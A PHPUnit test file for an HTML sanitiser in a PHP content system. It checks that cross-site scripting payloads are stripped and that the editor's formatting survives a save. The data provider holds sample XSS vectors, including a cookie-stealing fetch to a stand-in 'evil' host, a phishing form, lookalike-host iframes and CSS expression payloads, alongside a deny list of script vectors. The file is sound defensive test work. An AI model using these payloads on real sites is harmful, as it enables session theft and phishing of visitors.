<?php

namespace Tests\Unit;

use App\Support\HtmlSanitiser;
use PHPUnit\Framework\Attributes\DataProvider;
use Tests\TestCase;

/**
 * HtmlSanitiser is the only thing between a content-manager account and
 * script running on every visitor's page — the frontend renders these bodies
 * with dangerouslySetInnerHTML. These tests exist so that widening the
 * allowlist in config/purifier.php can never quietly reopen a hole.
 */
class HtmlSanitiserTest extends TestCase
{
    /** Vectors that must never survive, whatever the input was. */
    private const EXECUTABLE = [
        '<script', '<iframe', '<form', '<svg', '<object', '<embed',
        'javascript:', 'data:text/html',
        'onerror', 'onclick', 'onload', 'onmouseover',
        'style=',
    ];

    public static function attacks(): array
    {
        return [
            'script tag' => ['<p>Hi</p><script>alert(document.cookie)</script>'],
            'onerror attribute' => ['<img src=x onerror="fetch(\'//evil/\'+document.cookie)">'],
            'javascript: href' => ['<a href="javascript:alert(1)">click</a>'],
            'iframe' => ['<p>a</p><iframe src="//evil.example"></iframe>'],
            'onclick attribute' => ['<p onclick="alert(1)">text</p>'],
            'inline style' => ['<p style="position:fixed;top:0">overlay</p>'],
            'svg onload' => ['<svg/onload=alert(1)>'],
            'data URI image' => ['<img src="data:text/html;base64,PHNjcmlwdD4=">'],
            'phishing form' => ['<form action="//evil"><input name="pw"></form>'],
            'nested obfuscation' => ['<p><scr<script>ipt>alert(1)</scr</script>ipt></p>'],
            'uppercase script' => ['<SCRIPT>alert(1)</SCRIPT>'],
            'object embed' => ['<object data="//evil"></object>'],
            // The allowlist admits an iframe now, so the host check is the
            // only thing refusing these. Each is a way of getting past a
            // check written as "does the src mention youtube".
            'iframe to an unknown host' => ['<iframe src="https://evil.example/embed/x"></iframe>'],
            'youtube lookalike host' => ['<iframe src="https://www.youtube.com.attacker.test/embed/x"></iframe>'],
            'youtube in the path' => ['<iframe src="https://evil.example/www.youtube.com/embed/x"></iframe>'],
            'javascript: iframe' => ['<iframe src="javascript:alert(1)"></iframe>'],
            // Inline style is admitted now too, so these are the properties
            // and values that must still not get through it.
            'css expression' => ['<p style="width: expression(alert(1))">e</p>'],
            'css behaviour' => ['<p style="behavior: url(#default#time2)">b</p>'],
            'javascript: in a css url' => ['<span style="background-color: url(javascript:alert(1))">x</span>'],
            'fixed overlay' => ['<p style="position: fixed; top: 0; z-index: 9999">cover</p>'],
        ];
    }

    #[DataProvider('attacks')]
    public function test_it_strips_executable_content(string $dirty): void
    {
        $clean = (string) HtmlSanitiser::clean($dirty);

        foreach (self::EXECUTABLE as $vector) {
            $this->assertStringNotContainsStringIgnoringCase(
                $vector,
                $clean,
                "{$vector} survived sanitisation of: {$dirty}"
            );
        }
    }

    public function test_it_keeps_the_markup_prose_styles(): void
    {
        $clean = (string) HtmlSanitiser::clean(
            '<p>A firewall policy is not static.</p>'
            .'<h2>The stale object problem</h2><h3>Detail</h3>'
            .'<ul><li>Audit quarterly</li><li>Prefer <strong>FQDN</strong> objects</li></ul>'
            .'<ol><li>First</li></ol>'
            .'<p>See <a href="https://example.com/doc">the doc</a>, or <em>ask</em>.</p>'
            .'<blockquote>Worth quoting.</blockquote><p><code>iptables -L</code></p>'
            .'<table><thead><tr><th scope="col">Port</th></tr></thead><tbody><tr><td>443</td></tr></tbody></table>'
        );

        foreach (['<h2>', '<h3>', '<ul>', '<ol>', '<li>', '<strong>', '<em>',
            '<blockquote>', '<code>', '<table>', '<th scope="col">', '<td>'] as $kept) {
            $this->assertStringContainsString($kept, $clean);
        }

        $this->assertStringContainsString('href="https://example.com/doc"', $clean);
    }

    /**
     * An emptied editor posts markup, not "". Everything downstream — the
     * reading-time hook, "is this publishable" — should see that as empty.
     */
    public function test_it_normalises_an_emptied_editor_to_null(): void
    {
        $this->assertNull(HtmlSanitiser::clean('<p>&nbsp;</p>'));
        $this->assertNull(HtmlSanitiser::clean('<p></p>'));
        $this->assertNull(HtmlSanitiser::clean('   '));
        $this->assertNull(HtmlSanitiser::clean(''));
        $this->assertNull(HtmlSanitiser::clean(null));
    }

    public function test_it_keeps_an_image_only_body(): void
    {
        $clean = (string) HtmlSanitiser::clean('<p><img src="/storage/media/diagram.png" alt="Rack layout"></p>');

        $this->assertStringContainsString('<img', $clean);
        $this->assertStringContainsString('alt="Rack layout"', $clean);
    }

    /**
     * toText() feeds every derived meta description and the plain-text half
     * of the notification emails.
     *
     * strip_tags on its own deletes a tag without putting anything in its
     * place, so the end of one block ran into the start of the next: the
     * downloads page published "…asked for.Remote supportWhen an engineer…"
     * as its meta description, which is what a search engine showed.
     */
    public function test_it_puts_a_space_where_a_block_element_was(): void
    {
        $html = '<p>asked for.</p><h2>Remote support</h2><p>When an engineer.</p>';

        $this->assertSame(
            'asked for. Remote support When an engineer.',
            HtmlSanitiser::toText($html)
        );
    }

    /**
     * The other direction is just as wrong. An inline tag is inside a word as
     * often as it is around one, so spacing every tag would break the word.
     */
    public function test_it_does_not_split_a_word_at_an_inline_tag(): void
    {
        $this->assertSame('tenths of a second', HtmlSanitiser::toText('<p>ten<strong>ths</strong> of a second</p>'));
        $this->assertSame('A & B C', HtmlSanitiser::toText('<p>A &amp; B&nbsp;C</p>'));
    }

    public function test_it_separates_list_items_and_line_breaks(): void
    {
        $this->assertSame('alpha beta', HtmlSanitiser::toText('<ul><li>alpha</li><li>beta</li></ul>'));
        $this->assertSame('one two', HtmlSanitiser::toText('<p>one<br>two</p>'));
        $this->assertSame('one two', HtmlSanitiser::toText('<p>one<br />two</p>'));
    }

    public function test_it_collapses_whitespace_and_handles_empty_input(): void
    {
        $this->assertSame('a b', HtmlSanitiser::toText("<p>a</p>\n\n   <p>b</p>"));
        $this->assertSame('', HtmlSanitiser::toText(null));
        $this->assertSame('', HtmlSanitiser::toText(''));
        $this->assertSame('Just a sentence.', HtmlSanitiser::toText('Just a sentence.'));
    }

    /**
     * Every formatting control the editor offers, in one body.
     *
     * This is the round-trip half of the rule the purifier config states: a
     * toolbar button whose markup this class drops is a control that appears
     * to work and silently does nothing on save. Each assertion is one button
     * in web/src/components/admin/rich-text-editor.tsx.
     *
     * **The input is what a browser actually emits, not what it ought to.**
     * The editor formats through `document.execCommand`, so Bold gives `<b>`
     * and never `<strong>`, and the colour, family and size controls all give
     * `<font>`. Writing this test against the tidy markup instead was how the
     * first version of it passed while underline was being dropped on save.
     */
    public function test_it_keeps_every_formatting_control_the_editor_offers(): void
    {
        $clean = (string) HtmlSanitiser::clean(
            '<h4>A fourth level</h4>'
            .'<p><b>bold</b> <i>italic</i> <u>underline</u> <strike>struck</strike></p>'
            .'<p>H<sub>2</sub>O and x<sup>2</sup></p>'
            .'<pre>$ ip addr show</pre>'
            .'<hr>'
            .'<p><font color="#a33232">coloured</font></p>'
            .'<p><font face="Georgia">a family</font></p>'
            .'<p><span style="background-color: rgb(255, 255, 0);">highlighted</span></p>'
            .'<p style="text-align: center;">centred</p>'
            .'<p style="margin-left: 25px;">indented</p>'
            .'<p style="line-height: 2;">spaced</p>'
            .'<p><img src="/storage/media/rack.png" alt="Rack" style="float: left; width: 50%;"></p>'
            .'<table><tbody><tr><td colspan="2">merged</td></tr></tbody></table>'
        );

        foreach ([
            '<h4>', '<b>', '<i>', '<u>', '<sub>', '<sup>', '<pre>', '<hr',
            'text-decoration:line-through',
            'color:#a33232',
            'font-family:Georgia',
            'background-color:rgb(255,255,0)',
            'text-align:center',
            'margin-left:25px',
            'line-height:2',
            'float:left',
            'width:50%',
            'colspan="2"',
        ] as $kept) {
            $this->assertStringContainsString($kept, $clean, "{$kept} did not survive");
        }
    }

    /**
     * Deprecated elements are an input format, never a stored one.
     *
     * `<font>` and `<strike>` are admitted because that is what the browser
     * hands over, and HTMLPurifier's Tidy pass rewrites both into a `<span>`
     * carrying a validated declaration. That pass only runs at
     * `HTML.TidyLevel: heavy` — the shipped default is `medium`, at which the
     * deprecated element is quietly kept and written to the database instead.
     * Nothing else in the stack would have noticed.
     */
    public function test_it_normalises_deprecated_elements_rather_than_storing_them(): void
    {
        $clean = (string) HtmlSanitiser::clean(
            '<p><font color="#ff0000" face="Georgia">both</font> and <strike>struck</strike></p>'
        );

        $this->assertStringNotContainsString('<font', $clean);
        $this->assertStringNotContainsString('<strike', $clean);
        $this->assertStringContainsString('color:#ff0000', $clean);
        $this->assertStringContainsString('font-family:Georgia', $clean);
        $this->assertStringContainsString('text-decoration:line-through', $clean);
    }

    /**
     * `<u>` and `<s>` keep their own elements, and that is a deliberate
     * exception to the rule above.
     *
     * Tidy's `heavy` band would turn both into spans carrying a
     * `text-decoration`, which reproduces the appearance and throws the markup
     * away — so both are removed from the fix list. They are real elements,
     * the allowlist admits them and Prose styles them; a span is what you
     * settle for when there is nothing better, and here there is.
     */
    public function test_it_does_not_flatten_underline_and_strikethrough_to_spans(): void
    {
        $clean = (string) HtmlSanitiser::clean('<p><u>under</u> and <s>over</s></p>');

        $this->assertStringContainsString('<u>', $clean);
        $this->assertStringContainsString('<s>', $clean);
    }

    /**
     * A body that is only a video is not an empty body.
     *
     * This was a real defect and it was invisible from either side: HTMLPurifier
     * kept the iframe perfectly, and isBlank() then threw the whole result away
     * because there was no *text* in it — so embedding a clip, saving, and
     * being told it saved left the body null. `<img` used to be the only
     * exception, which was correct exactly while an image was the only
     * childless element the allowlist admitted.
     */
    public function test_it_keeps_a_body_whose_only_content_is_embedded(): void
    {
        $video = HtmlSanitiser::clean('<p><iframe src="//www.youtube.com/embed/dQw4w9WgXcQ" width="640" height="360"></iframe></p>');
        $this->assertNotNull($video);
        $this->assertStringContainsString('<iframe', (string) $video);

        $rule = HtmlSanitiser::clean('<hr>');
        $this->assertNotNull($rule);
        $this->assertStringContainsString('<hr', (string) $rule);
    }

    /**
     * The two hosts the video button may reach, and nothing else.
     *
     * Summernote's own list runs to nine — Instagram, DailyMotion, Youku, Vine,
     * Peertube and the rest — and each is a decision about who may run code in
     * a frame on this origin. The refusal is a host comparison rather than a
     * substring test, which is the trap App\Support\YouTube already documents
     * and which the provider above covers from the attacking side.
     *
     * Protocol-relative is the form the editor actually emits, so it is the
     * form that has to be accepted: a pattern insisting on https would drop
     * every video an editor inserted, on save, without saying so.
     */
    public function test_it_allows_only_the_two_video_hosts(): void
    {
        $allowed = [
            'youtube' => '//www.youtube.com/embed/dQw4w9WgXcQ',
            'youtube over https' => 'https://www.youtube.com/embed/dQw4w9WgXcQ',
            'youtube nocookie' => 'https://www.youtube-nocookie.com/embed/dQw4w9WgXcQ',
            'vimeo' => '//player.vimeo.com/video/76979871',
        ];

        foreach ($allowed as $label => $src) {
            $clean = (string) HtmlSanitiser::clean('<p>Watch:</p><p><iframe src="'.$src.'" width="640" height="360"></iframe></p>');
            $this->assertStringContainsString($src, $clean, "{$label} was refused and should not have been");
        }

        $refused = [
            'bare youtube.com' => 'https://youtube.com/embed/x',
            'a youtube watch page' => 'https://www.youtube.com/watch?v=x',
            'vimeo without the player host' => 'https://vimeo.com/video/1',
            'dailymotion' => 'https://www.dailymotion.com/embed/video/x',
        ];

        foreach ($refused as $label => $src) {
            $clean = (string) HtmlSanitiser::clean('<p>Watch:</p><p><iframe src="'.$src.'" width="640" height="360"></iframe></p>');
            $this->assertStringNotContainsString('<iframe', $clean, "{$label} survived and should not have");
        }
    }

    /**
     * Inline style is an allowlist of properties, not an open door.
     *
     * The distinction that matters: the editor's colour, size, alignment and
     * image-resize buttons all work by writing inline CSS, so refusing style
     * outright would break seven controls — but `position` is what lets body
     * content leave its own box and cover the page's chrome, and `display` is
     * what lets it hide something. Neither is any button's output.
     */
    public function test_it_drops_the_css_properties_no_button_produces(): void
    {
        $clean = (string) HtmlSanitiser::clean(
            '<p style="color: rgb(0, 0, 0); position: absolute; display: none; z-index: 99; opacity: 0;">text</p>'
        );

        $this->assertStringContainsString('color:rgb(0,0,0)', $clean);

        foreach (['position', 'display', 'z-index', 'opacity'] as $dropped) {
            $this->assertStringNotContainsString($dropped, $clean, "{$dropped} survived and should not have");
        }
    }

    /**
     * The editor's layout templates survive the round trip.
     *
     * This is the test the whole feature turns on. The layouts are built from
     * tables because the allowlist has no `div` and no `class` — a CSS grid
     * or flex answer to "two columns" would be stripped here on save, and the
     * editor would look like it worked until the page was reloaded, which is
     * exactly the failure `rich-text-editor.tsx` opens by warning about.
     *
     * If somebody later narrows `HTML.Allowed` or `CSS.AllowedProperties`,
     * this fails rather than the layouts quietly flattening into one column
     * on every page that used them.
     */
    public function test_the_editors_layout_templates_survive_intact(): void
    {
        $twoColumn = '<table style="width:100%;"><tbody>'
            .'<tr><td style="width:40%;"><img src="/layout-placeholder.svg" alt="" style="width:100%;"></td>'
            .'<td><h3>Section heading</h3><p>Copy.</p></td></tr>'
            .'</tbody></table>';

        $clean = (string) HtmlSanitiser::clean($twoColumn);

        foreach (['<table', '<tbody', '<tr>', '<td', 'width:40%', '<img', 'width:100%', '<h3'] as $kept) {
            $this->assertStringContainsString($kept, $clean, "{$kept} was dropped from a layout table");
        }

        // The centred single-column layout, which uses text-align rather than
        // a table and must keep both the alignment and the image width.
        $centred = (string) HtmlSanitiser::clean(
            '<p style="text-align:center;"><img src="/layout-placeholder.svg" alt="" style="width:60%;"></p>'
        );

        $this->assertStringContainsString('text-align:center', $centred);
        $this->assertStringContainsString('width:60%', $centred);
    }
}
